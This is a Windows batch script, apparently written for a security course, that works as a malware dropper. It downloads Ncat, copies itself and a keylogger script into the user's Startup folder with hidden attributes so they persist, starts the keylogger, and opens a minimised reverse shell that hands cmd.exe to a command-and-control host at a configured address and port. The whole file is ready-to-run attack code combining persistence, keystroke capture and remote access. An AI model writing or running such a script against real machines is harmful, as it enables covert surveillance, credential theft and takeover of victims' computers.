:: cmd_commands.bat
:: ---------------------------------------------------------------------------
:: One‑shot batch file that installs prerequisites, deploys persistence
:: (key‑logger + itself) into the current user's Startup folder *with hidden
:: attributes*, and finally opens a minimised Netcat reverse shell.
::
:: Tested on Windows 10 22H2.  Run from an elevated command prompt if you want
:: machine‑wide persistence; otherwise regular user privileges are enough for
:: the per‑user Startup method used below.
::
:: Author :  YOUR TEAM NAME
:: License:  MIT (for coursework purposes)
:: ---------------------------------------------------------------------------

@echo off
setlocal EnableDelayedExpansion

:: --------------------------- CONFIGURATION ----------------------------------
:: Change these two variables if your C2 VM or port differ.
set C2_HOST=172.20.10.15
set C2_PORT=12345

:: Name of netcat executable – can be any variant that supports -e.
set NC_EXE=ncat.exe

:: Path to the user's Startup folder
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: --------------------------- HELPER FUNCTIONS ------------------------------
:: :is_in_path <file>
::   returns 0 if the given file is anywhere in %PATH%
:is_in_path
where %1 >nul 2>nul && exit /b 0 || exit /b 1

:: --------------------------- INSTALL WINGET ---------------------------------
:: New Windows installs should already include WinGet.  We install Microsoft's
:: official AppInstaller bundle only if `winget` is missing.
where winget >nul 2>nul
if errorlevel 1 (
    echo [*] WinGet not found – downloading from Microsoft...
    powershell -Command ^
        "Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile '%TEMP%\AppInstaller.msixbundle'"
    echo [*] Installing WinGet silently...
    powershell -Command ^
        "Add-AppxPackage -Path '%TEMP%\AppInstaller.msixbundle'"
    attrib +h "%TEMP%\AppInstaller.msixbundle"
)

:: --------------------------- INSTALL NETCAT ---------------------------------
:: Download ncat only if it is not already present (in PATH or in script dir).
call :is_in_path %NC_EXE%
if errorlevel 1 (
    if not exist "%~dp0%NC_EXE%" (
        echo [*] Downloading Ncat from the official Nmap site...
        powershell -Command ^
            "Invoke-WebRequest -Uri 'https://nmap.org/dist/ncat-7.94.exe' -OutFile '%~dp0%NC_EXE%'"
    )
)

:: --------------------------- DEPLOY PAYLOADS --------------------------------
:: Copy this BAT and the key‑logger into Startup and make them hidden.
echo [*] Deploying persistence...
xcopy /Y /H "%~dpnx0" "%STARTUP_DIR%\%~nx0"       >nul
xcopy /Y /H "%~dp0keylog.py" "%STARTUP_DIR%\keylog.py"  >nul
attrib +h "%STARTUP_DIR%\%~nx0"
attrib +h "%STARTUP_DIR%\keylog.py"

:: --------------------------- FIRST‑RUN EXECUTION ----------------------------
echo [*] Starting key‑logger for this session...
start "" /min python "%STARTUP_DIR%\keylog.py"

:: --------------------------- REVERSE SHELL ----------------------------------
echo [*] Launching reverse shell to %C2_HOST%:%C2_PORT% …
start "" /min "%~dp0%NC_EXE%" %C2_HOST% %C2_PORT% -e cmd.exe

echo [*] All done – the window will now close.
endlocal
exit /b 0
